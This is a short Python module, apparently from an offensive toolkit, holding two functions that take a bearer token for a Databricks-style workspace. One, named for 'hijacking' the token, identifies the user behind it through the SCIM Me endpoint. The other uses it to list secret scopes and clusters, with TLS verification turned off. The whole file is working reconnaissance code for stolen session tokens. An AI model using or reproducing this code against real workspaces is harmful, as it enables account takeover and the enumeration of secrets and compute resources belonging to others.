import requests
from config import workspace_url, log
from core.utils import safe_json

def hijack_token_session(token):
    headers = {"Authorization": f"Bearer {token}"}
    log(f"[*] Using token {token[:10]}... for hijack attempt")
    try:
        me_resp = requests.get(f"{workspace_url}/api/2.0/preview/scim/v2/Me", headers=headers, verify=False)
        if me_resp.status_code == 200:
            user_info = safe_json(me_resp)
            log(f"[+] Token identity: {user_info.get('userName')} ({user_info.get('id')})")
            return user_info
        else:
            log(f"[-] Unable to identify token user. Status: {me_resp.status_code}")
    except Exception as e:
        log(f"[!] Error hijacking token: {e}", level="error")
    return None

def replay_token_activity(token):
    headers = {"Authorization": f"Bearer {token}"}
    try:
        secrets = requests.get(f"{workspace_url}/api/2.0/secrets/scopes/list", headers=headers, verify=False)
        if secrets.status_code == 200:
            log(f"[+] Token has secret access: {safe_json(secrets)}")
        clusters = requests.get(f"{workspace_url}/api/2.0/clusters/list", headers=headers, verify=False)
        if clusters.status_code == 200:
            log(f"[+] Token can list clusters")
    except Exception as e:
        log(f"[!] Token activity error: {e}", level="error")
